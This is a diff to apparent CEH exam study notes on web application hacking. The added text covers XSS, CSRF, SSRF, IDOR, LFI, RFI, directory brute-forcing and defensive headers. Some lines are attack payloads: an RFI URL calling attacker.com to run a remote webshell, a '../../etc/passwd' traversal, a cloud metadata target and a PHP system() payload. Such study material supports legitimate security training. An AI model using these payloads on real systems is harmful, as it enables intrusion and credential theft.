@@ -56,6 +56,14 @@
 
 ---
 
+> [!TIP]
+> **💡 In Simple Words — What Module 14 Is Really About:**  
+> Think of **Hacking Web Applications** as finding logic mistakes inside the website itself (not the server OS):  
+> - **XSS (Cross-Site Scripting):** Sneaking malicious JavaScript into a webpage so *every visitor's browser* runs your code and steals their login cookie!  
+> - **CSRF (Cross-Site Request Forgery):** Tricking an already logged-in user's browser into clicking an invisible auto-submitting form (*"Transfer \$5,000"*), because browsers attach session cookies automatically.  
+> - **SSRF (Server-Side Request Forgery):** Tricking the *backend server itself* into calling private internal cloud addresses (`169.254.169.254`) that outsiders cannot normally reach!  
+> - **IDOR / LFI:** Changing `?invoice_id=101` to `102` to read another customer's bill (**IDOR**), or `?page=../../../../etc/passwd` to read server system files (**LFI**).
+
 ## 1. Web Application Architecture & Threat Landscape
 
 ### The Multi-Tier Web Application Model
@@ -85,9 +93,14 @@ Modern web applications distribute logic across decoupled layers:
 +--------------------------------------------------------------------------+
 ```
 
+### HTTP Protocol, Headers, and Stateless Sessions
+HTTP is inherently **stateless** — every web request looks brand new to the server unless the browser attaches a `Cookie` or `Authorization` token. Key HTTP headers such as `Host`, `Origin`, `Referer`, `Cookie`, and `User-Agent` are prime manipulation targets in Burp Suite.
+
 ---
 
 ## 2. The OWASP Top 10 Framework
+
+### OWASP Top 10 Mapping & Core Tenets
 
 The **OWASP Top 10** represents the consensus standard on critical web application risks tested extensively in CEH v13:
 
@@ -110,28 +123,14 @@ The **OWASP Top 10** represents the consensus standard on critical web applicati
 
 Cross-Site Scripting occurs when untrusted input is reflected or rendered in a victim's browser without adequate sanitization or output encoding.
 
-```
-+--------------------------------------------------------------------------+
-|                         THE THREE TYPES OF XSS                           |
-+--------------------------------------------------------------------------+
-|  1. STORED (PERSISTENT) XSS:                                             |
-|  - Payload is permanently stored in the application's database (e.g.,    |
-|    comment section, user profile, message board).                        |
-|  - Executes automatically whenever any victim loads the affected page!   |
-|  - Highest severity XSS category.                                        |
-+--------------------------------------------------------------------------+
-|  2. REFLECTED (NON-PERSISTENT) XSS:                                      |
-|  - Payload is delivered via request parameters (URL query string, form   |
-|    inputs) and immediately reflected back in the server's HTTP response. |
-|  - Requires social engineering: Victim must click an attacker's link.    |
-+--------------------------------------------------------------------------+
-|  3. DOM-BASED XSS:                                                       |
-|  - The vulnerability exists entirely in client-side JavaScript.          |
-|  - Untrusted data from a "Source" (e.g., location.search, location.hash) |
-|    flows directly into an execution "Sink" (e.g., document.write,        |
-|    element.innerHTML, eval()) without ever touching the backend server!  |
-+--------------------------------------------------------------------------+
-```
+### Stored (Persistent) XSS
+The payload is permanently saved in the backend database (comments, profiles, support tickets) and executes automatically inside every visitor's browser that loads the page (**highest severity**).
+
+### Reflected (Non-Persistent) XSS
+The payload travels in a crafted URL parameter (`?q=<script>...`) and is immediately bounced back in the response — requiring the victim to click an attacker's phishing link.
+
+### DOM-Based XSS
+Occurs 100% inside client-side JavaScript when untrusted data flows from a **Source** (`location.search`, `location.hash`) into an unsafe execution **Sink** (`innerHTML`, `document.write()`, `eval()`) without hitting the server.
 
 ### XSS Exploitation Payloads & Session Stealing
 
@@ -203,7 +202,7 @@ In an SSRF attack, the attacker abuses functionality on the vulnerable web serve
 [ Attacker receives Cloud Keys in response! ]
 ```
 
-### High-Yield Cloud Metadata Endpoints
+### Cloud Metadata Service Attack (169.254.169.254)
 
 | Cloud Provider | Metadata IP Address & Endpoint | Required Headers / Notes |
 | :--- | :--- | :--- |
@@ -229,6 +228,9 @@ Host: target.com
 GET /api/v1/invoices?invoice_id=9846 HTTP/1.1
 Host: target.com
 ```
+
+### Directory Traversal & Path Manipulation
+Uses dot-dot-slash sequences (`../../../../`) to escape the restricted web directory and read sensitive OS configuration files (`/etc/passwd`, `C:\Windows\win.ini`).
 
 ### Local File Inclusion (LFI) & PHP Wrappers
 
@@ -256,6 +258,9 @@ Content-Length: 28
 
 <?php system('id; whoami'); ?>
 ```
+
+### Remote File Inclusion (RFI)
+If a PHP server enables `allow_url_include = On`, an attacker supplies an **external HTTP URL** (`?page=http://attacker.com/shell.txt`), forcing the vulnerable web server to download and immediately execute remote webshell code on the server!
 
 ---
 
@@ -294,11 +299,21 @@ Content-Length: 28
 +--------------------------------------------------------------------------+
 ```
 
+### Directory & Endpoint Brute-Forcing: Gobuster & Feroxbuster
+```bash
+# Fast recursive hidden endpoint & backup file discovery
+feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,bak,zip
+gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
+```
+
 ---
 
 ## 8. Web Application Hardening & Defensive Architecture
 
-### Security HTTP Response Headers
+### Web Application Firewalls (WAF)
+Inspects HTTP traffic at Layer 7 (ModSecurity, AWS WAF, Cloudflare) to block SQLi, XSS, and malicious scanner signatures before payloads reach application code.
+
+### Security HTTP Response Headers (CSP, HSTS, X-Frame-Options)
 
 | Header | Production Directive | Defensive Security Value |
 | :--- | :--- | :--- |
@@ -307,6 +322,10 @@ Content-Length: 28
 | **X-Frame-Options** | `DENY` or `SAMEORIGIN` | Defeats **Clickjacking** by preventing page rendering inside `<iframe>`. |
 | **X-Content-Type-Options** | `nosniff` | Prevents MIME-confusion attacks and rogue script execution from images. |
 | **Referrer-Policy** | `strict-origin-when-cross-origin` | Prevents sensitive query parameters / tokens leaking in `Referer` headers. |
+
+### Input Validation & Context-Aware Output Encoding
+* **Allowlist Input Validation:** Enforce strict type, length, and format verification on the server (never trust client-side HTML/JS validation alone!).
+* **Context-Aware Output Encoding:** Escape untrusted input based on where it renders (`&lt;` / `&gt;` in HTML body, JSON/JS escaping inside scripts) so browsers render strings as inert text rather than executable scripts.
 
 ---
 
